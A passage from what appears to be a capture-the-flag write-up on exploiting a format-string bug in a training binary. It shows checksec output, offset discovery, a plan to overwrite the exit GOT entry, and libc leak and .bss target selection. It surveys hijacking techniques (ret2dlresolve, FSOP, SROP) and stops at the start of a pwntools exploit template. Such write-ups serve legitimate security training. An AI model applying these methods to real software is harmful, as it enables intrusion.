              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Format String Attack - Format String Attack Twice (Full RELRO + PIE)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../13-Format-String-Attack-No-Dollar-Payload/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Format String Attack - No Dollar Payload
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
        
          
          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Windows
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5_3">
            <span class="md-nav__icon md-icon"></span>
            Windows
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Windows/Environment-setup/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Environment setup
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Redteam
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Redteam
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Redteam/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Index
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Reverse
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Reverse
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../Reverse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Index
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Crypto
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Crypto
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Index
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#babyfmt_level100" class="md-nav__link">
    <span class="md-ellipsis">
      babyfmt_level10.0
    </span>
  </a>
  
    <nav class="md-nav" aria-label="babyfmt_level10.0">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-offset-and-padlen-values" class="md-nav__link">
    <span class="md-ellipsis">
      find offset and padlen values
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#write-exit-got-entry-func-address" class="md-nav__link">
    <span class="md-ellipsis">
      Write exit got entry -&gt; func address
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leak-libc-address-write23" class="md-nav__link">
    <span class="md-ellipsis">
      Leak LIBC Address (write+23)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-suitable-writable-memory-map-bss" class="md-nav__link">
    <span class="md-ellipsis">
      Finding suitable writable memory map (bss)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#controlling-rip-register" class="md-nav__link">
    <span class="md-ellipsis">
      Controlling RIP Register
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get_flagpy" class="md-nav__link">
    <span class="md-ellipsis">
      get_flag.py
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
    <a href="https://github.com/ismailbozkurt/Dreamer-Wiki/blob/main/docs/Pwn/Linux/Format String Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-(Partial-RELRO+no-PIE).md" title="Edit this page" class="md-content__button md-icon" rel="edit">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
    </a>
  
  
    
      
    
    <a href="https://github.com/ismailbozkurt/Dreamer-Wiki/raw/main/docs/Pwn/Linux/Format String Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-(Partial-RELRO+no-PIE).md" title="View source of this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
    </a>
  


<h1 id="format-string-attack-format-string-attack-once-partial-relro-no-pie">Format String Attack - Format String Attack Once (Partial RELRO + no PIE)</h1>
<p>This time there is no <strong>win</strong> function. So the challenge expect us to redirect code execution somewhere else.</p>
<p>My opinion, this is where fun starts.</p>
<h2 id="babyfmt_level100">babyfmt_level10.0</h2>
<p>This challenge has <strong>Partial RELRO + no PIE</strong> protections. <strong>GOT entries</strong> lies in writable memory map and addresses are constant. </p>
<p>This variant the format string attack can be executed only once by the binary. Is it ?</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nt">root</span><span class="p">@</span><span class="k">a9b395169132</span><span class="o">:/</span><span class="nt">host</span><span class="err">#</span><span class="w"> </span><span class="nt">checksec</span><span class="w"> </span><span class="nt">babyfmt_level10</span><span class="p">.</span><span class="nc">0</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="o">[*]</span><span class="w"> </span><span class="s1">&#39;/host/babyfmt_level10.0&#39;</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nt">Arch</span><span class="o">:</span><span class="w">       </span><span class="nt">amd64-64-little</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="nt">RELRO</span><span class="o">:</span><span class="w">      </span><span class="nt">Partial</span><span class="w"> </span><span class="nt">RELRO</span>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="nt">Stack</span><span class="o">:</span><span class="w">      </span><span class="nt">No</span><span class="w"> </span><span class="nt">canary</span><span class="w"> </span><span class="nt">found</span>
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="nt">NX</span><span class="o">:</span><span class="w">         </span><span class="nt">NX</span><span class="w"> </span><span class="nt">enabled</span>
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="nt">PIE</span><span class="o">:</span><span class="w">        </span><span class="nt">No</span><span class="w"> </span><span class="nt">PIE</span><span class="w"> </span><span class="o">(</span><span class="nt">0x400000</span><span class="o">)</span>
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span><span class="nt">SHSTK</span><span class="o">:</span><span class="w">      </span><span class="nt">Enabled</span>
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">    </span><span class="nt">IBT</span><span class="o">:</span><span class="w">        </span><span class="nt">Enabled</span>
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span><span class="nt">Stripped</span><span class="o">:</span><span class="w">   </span><span class="nt">No</span>
</code></pre></div>
<p>As shown below, <strong>printf</strong> called and than calling <strong>exit</strong>. Same as previous one.</p>
<p><img alt="" src="../images/bd1129227998326adddd472e79135263.png" /></p>
<p>There are several ways to abuse this one. But for simplicity the execution will be looped.
If <strong>exit got entry</strong> written with <strong>func</strong> address, the program never exit and that means infinite format string attack. </p>
<h3 id="find-offset-and-padlen-values">find offset and padlen values</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="o">[+]</span><span class="w"> </span><span class="nt">Receiving</span><span class="w"> </span><span class="nt">all</span><span class="w"> </span><span class="nt">data</span><span class="o">:</span><span class="w"> </span><span class="nt">Done</span><span class="w"> </span><span class="o">(</span><span class="nt">174B</span><span class="o">)</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="o">[</span><span class="nt">DEBUG</span><span class="o">]</span><span class="w"> </span><span class="nt">Received</span><span class="w"> </span><span class="nt">0xae</span><span class="w"> </span><span class="nt">bytes</span><span class="o">:</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="nt">b</span><span class="s1">&#39;Here is the result:\n&#39;</span>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">    </span><span class="nt">b</span><span class="s1">&#39;Your input is:                                                                                             \n&#39;</span>
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">    </span><span class="nt">b</span><span class="s1">&#39;aaaabaaacaaadaaaeaaaSTART0x6161616361616162END&#39;</span>
<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="o">[*]</span><span class="w"> </span><span class="nt">Process</span><span class="w"> </span><span class="s1">&#39;/host/babyfmt_level10.0&#39;</span><span class="w"> </span><span class="nt">stopped</span><span class="w"> </span><span class="nt">with</span><span class="w"> </span><span class="nt">exit</span><span class="w"> </span><span class="nt">code</span><span class="w"> </span><span class="nt">0</span><span class="w"> </span><span class="o">(</span><span class="nt">pid</span><span class="w"> </span><span class="nt">279</span><span class="o">)</span>
<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="o">[*]</span><span class="w"> </span><span class="nt">Found</span><span class="w"> </span><span class="nt">format</span><span class="w"> </span><span class="nt">string</span><span class="w"> </span><span class="nt">offset</span><span class="o">:</span><span class="w"> </span><span class="nt">46</span>
<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="o">[+]</span><span class="w"> </span><span class="nt">User</span><span class="w"> </span><span class="nt">input</span><span class="w"> </span><span class="nt">starts</span><span class="w"> </span><span class="nt">at</span><span class="w">  </span><span class="o">:</span><span class="w"> </span><span class="nt">46</span>
<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="o">[+]</span><span class="w"> </span><span class="nt">Needed</span><span class="w"> </span><span class="nt">pads</span><span class="w">           </span><span class="p">:</span><span class="nd">4</span>
<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="o">[+]</span><span class="w"> </span><span class="nt">Numbwritten</span><span class="w">           </span><span class="p">:</span><span class="nd">0</span>
</code></pre></div>
<h3 id="write-exit-got-entry-func-address">Write exit got entry -&gt; func address</h3>
<p>The offset, padlen and numbwritten values detected as previous [[08 - Format String Attack - Redirect Code Execution to win (Full Relro+PIE Enabled)#^numbwritten-calculation|numbwritten calculation]].</p>
<p><img alt="" src="../images/649f48f5baac6df9813fb999da73f308.png" /></p>
<h3 id="leak-libc-address-write23">Leak LIBC Address (write+23)</h3>
<p>Same as previous one, the 3rd offset is the write+23 address. This for the readers practicing other potential targets, i decided to leak also canary value.</p>
<p><img alt="" src="../images/8e7bb681ecc42d5e2d469c58cadc2ef9.png" /></p>
<h3 id="finding-suitable-writable-memory-map-bss">Finding suitable writable memory map (bss)</h3>
<p>At this point everything is ready, the only needing is finding writable memory map and fill there. Generally chosen <strong>.bss segment</strong>. </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nt">root</span><span class="p">@</span><span class="k">a9b395169132</span><span class="o">:/</span><span class="nt">host</span><span class="err">#</span><span class="w"> </span><span class="nt">readelf</span><span class="w"> </span><span class="nt">-S</span><span class="w"> </span><span class="nt">babyfmt_level10</span><span class="p">.</span><span class="nc">0</span><span class="o">|</span><span class="nt">grep</span><span class="w"> </span><span class="nt">-A3</span><span class="w"> </span><span class="nt">-B3</span><span class="w"> </span><span class="s1">&#39;.bss&#39;</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">       </span><span class="nt">0000000000000070</span><span class="w">  </span><span class="nt">0000000000000008</span><span class="w">  </span><span class="nt">WA</span><span class="w">       </span><span class="nt">0</span><span class="w">     </span><span class="nt">0</span><span class="w">     </span><span class="nt">8</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span><span class="o">[</span><span class="nt">25</span><span class="o">]</span><span class="w"> </span><span class="p">.</span><span class="nc">data</span><span class="w">             </span><span class="nt">PROGBITS</span><span class="w">         </span><span class="nt">0000000000404070</span><span class="w">  </span><span class="nt">00003070</span>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">       </span><span class="nt">0000000000000010</span><span class="w">  </span><span class="nt">0000000000000000</span><span class="w">  </span><span class="nt">WA</span><span class="w">       </span><span class="nt">0</span><span class="w">     </span><span class="nt">0</span><span class="w">     </span><span class="nt">8</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">  </span><span class="o">[</span><span class="nt">26</span><span class="o">]</span><span class="w"> </span><span class="p">.</span><span class="nc">bss</span><span class="w">              </span><span class="nt">NOBITS</span><span class="w">           </span><span class="nt">0000000000404080</span><span class="w">  </span><span class="nt">00003080</span>
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">       </span><span class="nt">0000000000000068</span><span class="w">  </span><span class="nt">0000000000000000</span><span class="w">  </span><span class="nt">WA</span><span class="w">       </span><span class="nt">0</span><span class="w">     </span><span class="nt">0</span><span class="w">     </span><span class="nt">32</span>
<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">  </span><span class="o">[</span><span class="nt">27</span><span class="o">]</span><span class="w"> </span><span class="p">.</span><span class="nc">comment</span><span class="w">          </span><span class="nt">PROGBITS</span><span class="w">         </span><span class="nt">0000000000000000</span><span class="w">  </span><span class="nt">00003080</span>
<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">       </span><span class="nt">000000000000002b</span><span class="w">  </span><span class="nt">0000000000000001</span><span class="w">  </span><span class="nt">MS</span><span class="w">       </span><span class="nt">0</span><span class="w">     </span><span class="nt">0</span><span class="w">     </span><span class="nt">1</span>
</code></pre></div>
<p>The <strong>.bss</strong> segment starts at <code>0x404080</code>. One important thing to note: since the binary repeatedly calls functions like <code>printf</code>, <code>read</code>, <code>puts</code>, and <code>memset</code> through <code>func</code>, overwriting the <strong>stdin</strong>, <strong>stdout</strong>, or <strong>stderr</strong> pointers in the <strong>.bss</strong> section can cause unintended crashes or behavior.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nt">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">tele</span><span class="w"> </span><span class="nt">0x404080</span><span class="w"> </span><span class="nt">32</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nt">00</span><span class="p">:</span><span class="nd">0000</span><span class="err">â</span><span class="w">     </span><span class="nt">0x404080</span><span class="w"> </span><span class="o">(</span><span class="nt">stdout</span><span class="o">@</span><span class="p">@</span><span class="k">GLIBC_2</span><span class="p">.</span><span class="nc">2</span><span class="p">.</span><span class="nc">5</span><span class="o">)</span><span class="w"> </span><span class="err">ââ¸</span><span class="w"> </span><span class="nt">0x7f0b57b6d6a0</span><span class="w"> </span><span class="o">(</span><span class="nt">_IO_2_1_stdout_</span><span class="o">)</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">0xfbad2887</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nt">01</span><span class="p">:</span><span class="nd">0008</span><span class="err">â</span><span class="w">     </span><span class="nt">0x404088</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">0</span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nt">02</span><span class="p">:</span><span class="nd">0010</span><span class="err">â</span><span class="w">     </span><span class="nt">0x404090</span><span class="w"> </span><span class="o">(</span><span class="nt">stdin</span><span class="o">@</span><span class="p">@</span><span class="k">GLIBC_2</span><span class="p">.</span><span class="nc">2</span><span class="p">.</span><span class="nc">5</span><span class="o">)</span><span class="w"> </span><span class="err">ââ¸</span><span class="w"> </span><span class="nt">0x7f0b57b6c980</span><span class="w"> </span><span class="o">(</span><span class="nt">_IO_2_1_stdin_</span><span class="o">)</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">0xfbad208b</span>
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="nt">03</span><span class="p">:</span><span class="nd">0018</span><span class="err">â</span><span class="w">     </span><span class="nt">0x404098</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">0</span>
<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="nt">04</span><span class="p">:</span><span class="nd">0020</span><span class="err">â</span><span class="w">     </span><span class="nt">0x4040a0</span><span class="w"> </span><span class="o">(</span><span class="nt">stderr</span><span class="o">@</span><span class="p">@</span><span class="k">GLIBC_2</span><span class="p">.</span><span class="nc">2</span><span class="p">.</span><span class="nc">5</span><span class="o">)</span><span class="w"> </span><span class="err">ââ¸</span><span class="w"> </span><span class="nt">0x7f0b57b6d5c0</span><span class="w"> </span><span class="o">(</span><span class="nt">_IO_2_1_stderr_</span><span class="o">)</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">0xfbad2087</span>
</code></pre></div>
<p>I chose as target address <strong>exe.bss()+0x680 = 0x404700</strong>.</p>
<h3 id="controlling-rip-register">Controlling RIP Register</h3>
<p>Preparations mostly done. Now its decided how to get control of RIP into controlled area.
To achieve that, decided to overwrite <strong>printf</strong>'s return value in the stack.</p>
<blockquote>
<p>Why this technique ?</p>
<blockquote>
<p>The reason, stack values are known. This means there are several simple ways to get the job done. 
1. The gadgets can be written into controlled area via format string abuse
2. The gadgets can be written into stack via read and than jump into that stack area.</p>
</blockquote>
</blockquote>
<p>If stack addresses werenât known, weâd pivot to <strong>non-stack control points</strong> instead. A <strong>ret2dlresolve</strong> chain is often the next step: by crafting fake relocation, symbol, and string table entries in a writable region, then invoking the PLT resolver, you can resolve arbitrary functions at runtime even if they werenât originally imported.</p>
<p>After leaking libcâs base address, late-exit hooks such as <strong><code>__exit_funcs</code></strong>, <strong><code>atexit</code></strong>, or <strong><code>tls_dtor_list</code></strong> may become viable targets, since they hold function pointers executed at program shutdown and can still reside in writable libc data segments on some builds.</p>
<p>Beyond direct function-pointer overwrites, <strong>FSOP (File Structure Oriented Programming)</strong> can be used on older or un-hardened libcs: by forging <code>_IO_FILE</code> structures and manipulating the <code>_IO_list_all</code> or vtables, attackers can redirect control flow when standard I/O cleanup routines run.</p>
<p>And when ROP gadgets are limited or awkward to use, techniques like <strong>ret2csu</strong> or compiler-inserted constructor/destructor stubs in <code>__libc_csu_init</code> can help bootstrap controlled function calls or info-leaks by setting up multiple registers at once. Other modern pivots include abusing <strong>GOT entries</strong> under Partial RELRO, manipulating <strong>dynamic linker hooks</strong> (<code>_dl_fini</code>, <code>_rtld_global</code> structures), or crafting <strong>SROP</strong> chains to directly control the CPU context via <code>sigreturn</code>.</p>
<p>The shared PoC script, overwriting <strong>printf</strong> return address in the stack and +8 bytes.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="ch">#!/usr/bin/env python3</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c1"># -*- coding: utf-8 -*-</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="c1"># This exploit template was generated via:</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># $ pwn template &#39;--libc=./libc.so.6&#39; ./babyfmt_level10.0</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1"># Set up pwntools for the correct architecture</span>
<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">EXE</span> <span class="ow">or</span> <span class="s1">&#39;./babyfmt_level10.0&#39;</span><span class="p">)</span>
<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="c1"># Many built-in settings can be controlled on the command-line and show up</span>
<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="c1"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span>
<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="c1"># for all created processes...</span>
<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="c1"># ./exploit.py DEBUG NOASLR</span>
<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>
<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="c1"># Use the specified remote libc version unless explicitly told to use the</span>
<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="c1"># local system version with the `LOCAL_LIBC` argument.</span>
<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="c1"># ./exploit.py LOCAL LOCAL_LIBC</span>
<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL_LIBC</span><span class="p">:</span>
<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>    <span class="n">libc</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">libc</span>
<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="k">else</span><span class="p">:</span>
<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>    <span class="n">library_path</span> <span class="o">=</span> <span class="n">libcdb</span><span class="o">.</span><span class="n">download_libraries</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>    <span class="k">if</span> <span class="n">library_path</span><span class="p">:</span>
<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>        <span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">patch_custom_libraries</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">library_path</span><span class="p">)</span>
<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>        <span class="n">libc</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">libc</span>
<a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>    <span class="k">else</span><span class="p">:</span>
<a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
<a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>
<a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a><span class="k">def</span><span class="w"> </span><span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
<a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a><span class="w">    </span><span class="sd">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
<a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
<a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
<a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>    <span class="k">else</span><span class="p">:</span>
<a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
<a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>
<a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a><span class="c1"># Specify your GDB script here for debugging</span>
